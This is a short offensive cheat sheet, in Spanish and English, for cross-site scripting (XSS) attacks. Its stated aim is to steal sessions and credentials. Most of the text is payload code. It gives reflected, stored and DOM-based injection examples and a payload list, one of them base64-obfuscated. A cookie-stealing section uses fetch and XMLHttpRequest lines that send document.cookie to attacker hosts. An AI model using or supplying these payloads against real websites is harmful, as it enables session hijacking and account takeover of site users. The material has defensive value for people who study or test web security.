---
title: Cross-Site Scripting (XSS)
phase: explotacion
platform: web
tags: [xss, web, scripting, browser]
risk: medium
attack_tactic: TA0002
attack_technique: T1059
data_sources: [web-server-logs, browser-logs, waf-logs]
last_review: 2026-05-25
---

# Cross-Site Scripting (XSS)

### Objetivo

Injectar JavaScript en páginas web para robar sesiones, capturar credenciales, o realizar acciones au nombre del usuario.

### Types

```bash
# Reflected (URL parameter)
https://target.com/search?q=<script>alert(1)</script>

# Stored (persisted in DB)
<img src=x onerror=alert(1)>

# DOM-based (client-side)
javascript:alert(document.domain)
```

### Payload Cheatsheet

```html
<script>alert(document.domain)</script>
<script>alert(1)</script>
<Img src=x onerror=fetch('http://attacker/?c='+btoa(document.cookie))>
<Svg onload=fetch('http://attacker/?c='+document.cookie)>
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
```

### Cookie Stealing

```html
<script>
fetch('http://attacker.com/steal?c='+encodeURIComponent(document.cookie));
</script>

<script>
var req=new XMLHttpRequest();
req.open('GET','http://attacker/?c='+btoa(document.cookie),false);
req.send();
</script>
